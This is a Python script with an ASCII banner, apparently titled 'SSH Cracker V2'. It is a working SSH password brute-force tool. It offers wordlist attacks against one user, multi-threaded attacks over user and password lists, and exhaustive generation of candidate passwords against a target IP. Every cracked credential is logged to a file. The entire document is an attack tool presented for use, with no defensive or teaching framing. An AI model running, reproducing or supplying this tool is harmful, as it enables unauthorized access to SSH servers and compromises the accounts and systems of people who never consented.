# error check for libraries
try:
    import paramiko
    from tqdm import tqdm
except ImportError:
    print("Error: Install libraries using 'pip install paramiko tqdm'")
    exit()

# importing libraries
import concurrent.futures
import itertools

# ssh crack logic
def ssh_test(ip, user, pwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=ip, username=user, password=pwd, timeout=2)
        with open("success.txt", "a") as f:
            f.write(f"User: {user} | Pass: {pwd}\n")
        client.close()
        return True
    except:
        client.close()
        return False

art = r"""  ______    ______   __    __         ______   _______    ______    ______   __    __  ________  _______      __     __   ______  
 /      \  /      \ |  \  |  \       /      \ |       \  /      \  /      \ |  \  /  \|        \|       \    |  \   |  \ /      \ 
|  $$$$$$\|  $$$$$$\| $$  | $$      |  $$$$$$\| $$$$$$$\|  $$$$$$\|  $$$$$$\| $$ /  $$| $$$$$$$$| $$$$$$$\   | $$   | $$|  $$$$$$\
| $$___\$$| $$___\$$| $$__| $$      | $$   \$$| $$__| $$| $$__| $$| $$   \$$| $$/  $$ | $$__    | $$__| $$   | $$   | $$ \$$__| $$
 \$$    \  \$$    \ | $$    $$      | $$      | $$    $$| $$    $$| $$      | $$  $$  | $$  \   | $$    $$    \$$\ /  $$ /      $$
 _\$$$$$$\ _\$$$$$$\| $$$$$$$$      | $$   __ | $$$$$$$\| $$$$$$$$| $$   __ | $$$$$\  | $$$$$   | $$$$$$$\     \$$\  $$ |  $$$$$$ 
|  \__| $$|  \__| $$| $$  | $$      | $$__/  \| $$  | $$| $$  | $$| $$__/  \| $$ \$$\ | $$_____ | $$  | $$      \$$ $$  | $$_____ 
 \$$    $$ \$$    $$| $$  | $$       \$$    $$| $$  | $$| $$  | $$ \$$    $$| $$  \$$\| $$     \| $$  | $$ ______\$$$   | $$     \
  \$$$$$$   \$$$$$$  \$$   \$$        \$$$$$$  \$$   \$$ \$$   \$$  \$$$$$$  \$$   \$$ \$$$$$$$$ \$$   \$$|      \\$     \$$$$$$$$
                                                                                                           \$$$$$$                
                                                                                                                                  """

# welcome text/menu
print(art)
print("[+] 1. Single User\n[+] 2. Multi-threaded\n[+] 3. Generate Passwords")
choice = input("Choose Option: ")
target = input("Target IP: ")
found = False

# single machine crack logic
if choice == '1':
    user = input("[+] Username: ")
    pass_file = input("[+] Password file: ")
    with open(pass_file) as f:
        for p in tqdm(f.read().splitlines()):
            if ssh_test(target, user, p):
                print(f"\n[+] Found: {p}")
                found = True
                break
# multi-threaded crack logic
elif choice == '2':
    u_file = input("[+] User file: ")
    p_file = input("[+] Pass file: ")
    threads = int(input("[+] Threads: "))

    users = open(u_file).read().splitlines()
    passwords = open(p_file).read().splitlines()
    combos = [(u, p) for u in users for p in passwords]

    print("[*] Testing combinations...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
        tasks = {pool.submit(ssh_test, target, u, p): (u, p) for u, p in combos}
        for task in tqdm(concurrent.futures.as_completed(tasks), total=len(tasks)):
            if task.result():
                user, pwd = tasks[task] # get the specific user&pass from the task
                print(f"\n[+] Match Found: {user}:{pwd}")
                found = True
                pool.shutdown(wait=False, cancel_futures=True) # stop other threads
                break

# generate passsword logic
elif choice == '3':
    user = input("Username: ")
    chars = input("Chars (abc123): ")
    length = int(input("Length: "))
    for p in tqdm(itertools.product(chars, repeat=length)):
        pwd = "".join(p)
        if ssh_test(target, user, pwd):
            print(f"\n[+] Found: {pwd}")
            found = True
            break

if found:
    print("[+] Password cracked Successfuly")
else:
    print("\n[+] Password list Exhausted Try with new List")